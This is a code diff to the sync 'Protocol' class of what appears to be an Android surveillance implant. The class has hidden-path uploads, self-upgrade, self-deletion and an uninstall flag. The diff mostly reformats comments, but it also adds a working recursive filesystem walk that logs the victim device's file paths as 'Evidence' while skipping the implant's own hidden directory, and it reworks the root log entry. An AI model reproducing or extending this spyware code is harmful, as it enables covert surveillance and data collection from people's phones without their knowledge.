@@ -17,6 +17,7 @@ package com.ht.RCSAndroidGUI.action.sync;
 
 import java.io.ByteArrayOutputStream;
 import java.io.DataOutputStream;
+import java.io.File;
 import java.io.IOException;
 import java.util.Date;
 import java.util.Vector;
@@ -39,7 +40,7 @@ import com.ht.RCSAndroidGUI.utils.WChar;
  * The Class Protocol.
  */
 public abstract class Protocol {
-	
+
 	/** The Constant UPGRADE_FILENAME. */
 	public static final String UPGRADE_FILENAME = "core-update";
 
@@ -53,14 +54,15 @@ public abstract class Protocol {
 
 	/** The reload. */
 	public boolean reload;
-	
+
 	/** The uninstall. */
 	public boolean uninstall;
 
 	/**
 	 * Inits the.
-	 *
-	 * @param transport the transport
+	 * 
+	 * @param transport
+	 *            the transport
 	 * @return true, if successful
 	 */
 	public boolean init(final Transport transport) {
@@ -71,19 +73,23 @@ public abstract class Protocol {
 
 	/**
 	 * Perform.
-	 *
+	 * 
 	 * @return true, if successful
-	 * @throws ProtocolException the protocol exception
+	 * @throws ProtocolException
+	 *             the protocol exception
 	 */
 	public abstract boolean perform() throws ProtocolException;
 
 	/**
 	 * Save new conf.
-	 *
-	 * @param conf the conf
-	 * @param offset the offset
+	 * 
+	 * @param conf
+	 *            the conf
+	 * @param offset
+	 *            the offset
 	 * @return true, if successful
-	 * @throws CommandException the command exception
+	 * @throws CommandException
+	 *             the command exception
 	 */
 	public synchronized static boolean saveNewConf(final byte[] conf,
 			final int offset) throws CommandException {
@@ -100,9 +106,11 @@ public abstract class Protocol {
 
 	/**
 	 * Save upload.
-	 *
-	 * @param filename the filename
-	 * @param content the content
+	 * 
+	 * @param filename
+	 *            the filename
+	 * @param content
+	 *            the content
 	 */
 	public static void saveUpload(final String filename, final byte[] content) {
 		final AutoFile file = new AutoFile(Path.hidden());
@@ -122,8 +130,9 @@ public abstract class Protocol {
 
 	/**
 	 * Upgrade multi.
-	 *
-	 * @param files the files
+	 * 
+	 * @param files
+	 *            the files
 	 * @return true, if successful
 	 */
 	public static boolean upgradeMulti(final Vector files) {
@@ -133,7 +142,7 @@ public abstract class Protocol {
 
 	/**
 	 * Delete self.
-	 *
+	 * 
 	 * @return true, if successful
 	 */
 	public static boolean deleteSelf() {
@@ -144,8 +153,9 @@ public abstract class Protocol {
 
 	/**
 	 * Save download log.
-	 *
-	 * @param filefilter the filefilter
+	 * 
+	 * @param filefilter
+	 *            the filefilter
 	 */
 	public static void saveDownloadLog(final String filefilter) {
 		AutoFile file = new AutoFile(filefilter);
@@ -179,9 +189,11 @@ public abstract class Protocol {
 
 	/**
 	 * Save file log.
-	 *
-	 * @param file the file
-	 * @param filename the filename
+	 * 
+	 * @param file
+	 *            the file
+	 * @param filename
+	 *            the filename
 	 */
 	private static void saveFileLog(final AutoFile file, final String filename) {
 
@@ -201,8 +213,9 @@ public abstract class Protocol {
 
 	/**
 	 * Log download additional.
-	 *
-	 * @param filename the filename
+	 * 
+	 * @param filename
+	 *            the filename
 	 * @return the byte[]
 	 */
 	private static byte[] logDownloadAdditional(String filename) {
@@ -244,9 +257,11 @@ public abstract class Protocol {
 
 	/**
 	 * Save filesystem.
-	 *
-	 * @param depth the depth
-	 * @param path the path
+	 * 
+	 * @param depth
+	 *            the depth
+	 * @param path
+	 *            the path
 	 */
 	public static void saveFilesystem(final int depth, String path) {
 		final Evidence fsLog = new Evidence(0);
@@ -276,9 +291,11 @@ public abstract class Protocol {
 
 	/**
 	 * Expand the root for a maximum depth. 0 means only root, 1 means its sons.
-	 *
-	 * @param fsLog the fs log
-	 * @param depth the depth
+	 * 
+	 * @param fsLog
+	 *            the fs log
+	 * @param depth
+	 *            the depth
 	 */
 	private static void expandRoot(final Evidence fsLog, final int depth) {
 		// #ifdef DBC
@@ -286,15 +303,17 @@ public abstract class Protocol {
 		// #endif
 
 		saveRootLog(fsLog); // depth 0
+		expandPath(fsLog, "/", depth);
 
-		expandPath(fsLog, "/", depth - 1);
 	}
 
 	/**
 	 * Save filesystem log.
-	 *
-	 * @param fsLog the fs log
-	 * @param filepath the filepath
+	 * 
+	 * @param fsLog
+	 *            the fs log
+	 * @param filepath
+	 *            the filepath
 	 * @return true, if successful
 	 */
 	private static boolean saveFilesystemLog(final Evidence fsLog,
@@ -356,8 +375,9 @@ public abstract class Protocol {
 	/**
 	 * saves the root log. We use this method because the directory "/" cannot
 	 * be opened, we fake it.
-	 *
-	 * @param fsLog the fs log
+	 * 
+	 * @param fsLog
+	 *            the fs log
 	 */
 	private static void saveRootLog(final Evidence fsLog) {
 		final int version = 2010031501;
@@ -365,39 +385,35 @@ public abstract class Protocol {
 		// #ifdef DBC
 		Check.requires(fsLog != null, "fsLog null");
 		// #endif
-		// byte[] content = new byte[30];
-		try {
-			final ByteArrayOutputStream output = new ByteArrayOutputStream();
-			final DataOutputStream databuffer = new DataOutputStream(
-					new ByteArrayOutputStream());
-			databuffer.writeInt(version);
-			databuffer.writeInt(2); // len
-			databuffer.writeInt(1); // flags
-			databuffer.writeLong(0);
-			databuffer.writeLong(DateTime.getFiledate(new Date()));
-			databuffer.write(WChar.getBytes("/"));
-			databuffer.flush();
+		byte[] content = new byte[30];
 
-			fsLog.writeEvidence(output.toByteArray());
-		} catch (final IOException ex) {
-			debug.error(ex);
-		}
+		final DataBuffer databuffer = new DataBuffer(content);
+		databuffer.writeInt(version);
+		databuffer.writeInt(2); // len
+		databuffer.writeInt(1); // flags
+		databuffer.writeLong(0);
+		databuffer.writeLong(DateTime.getFiledate(new Date()));
+		databuffer.write(WChar.getBytes("/"));
+		fsLog.writeEvidence(content);
 	}
 
 	/**
 	 * Expand recursively the path saving the log. When depth is 0 saves the log
 	 * and stop recurring.
-	 *
-	 * @param fsLog the fs log
-	 * @param path the path
-	 * @param depth the depth
+	 * 
+	 * @param fsLog
+	 *            the fs log
+	 * @param path
+	 *            the path
+	 * @param depth
+	 *            the depth
 	 */
 	private static void expandPath(final Evidence fsLog, final String path,
 			final int depth) {
 		// #ifdef DBC
 		Check.requires(depth > 0, "wrong recursion depth");
 		Check.requires(path != null, "path==null");
-		Check.requires(!path.endsWith("/"), "path shouldn't end with /");
+		Check.requires(path.endsWith("/"), "path should end with /");
 		Check.requires(!path.endsWith("*"), "path shouldn't end with *");
 		// #endif
 
@@ -405,29 +421,33 @@ public abstract class Protocol {
 		debug.trace("expandPath: " + path + " depth: " + depth);
 		// #endif
 
-		/*
-		 * // saveFilesystemLog(path); // if (depth > 0) { for (Enumeration en =
-		 * Directory.find(path + "/*"); en.hasMoreElements();) {
-		 * 
-		 * String dPath = path + "/" + (String) en.nextElement(); if
-		 * (dPath.endsWith("/")) { // #ifdef DEBUG
-		 * debug.trace("expandPath: dir"); // #endif dPath = dPath.substring(0,
-		 * dPath.length() - 1); // togli lo / } else { // #ifdef DEBUG
-		 * debug.trace("expandPath: file"); // #endif }
-		 * 
-		 * if (dPath.indexOf(Utils.chomp(Path.SD(), "/")) >= 0 ||
-		 * dPath.indexOf(Utils.chomp(Path.USER(), "/")) >= 0) { // #ifdef DEBUG
-		 * debug.warn("expandPath ignoring hidden path: " + dPath); // #endif
-		 * continue; }
-		 * 
-		 * boolean isDir = Protocol.saveFilesystemLog(fsLog, dPath); if (isDir
-		 * && depth > 1) { expandPath(fsLog, dPath, depth - 1); } } // }
-		 */}
+		File dir = new File(path);
+		if (dir.isDirectory()) {
+			String[] files = dir.list();
+
+			for (String file : files) {
+				String dPath = path + file;
+				if (dPath.indexOf(Utils.chomp(Path.hidden(), "/")) >= 0) {
+					// #ifdef DEBUG
+					debug.warn("expandPath ignoring hidden path: " + dPath);
+					// #endif
+					continue;
+				}
+
+				boolean isDir = Protocol.saveFilesystemLog(fsLog, dPath);
+				if (isDir && depth > 1) {
+					expandPath(fsLog, dPath + "/", depth - 1);
+				}
+			}
+		}
+
+	}
 
 	/**
 	 * Normalize filename.
-	 *
-	 * @param file the file
+	 * 
+	 * @param file
+	 *            the file
 	 * @return the string
 	 */
 	public static String normalizeFilename(final String file) {
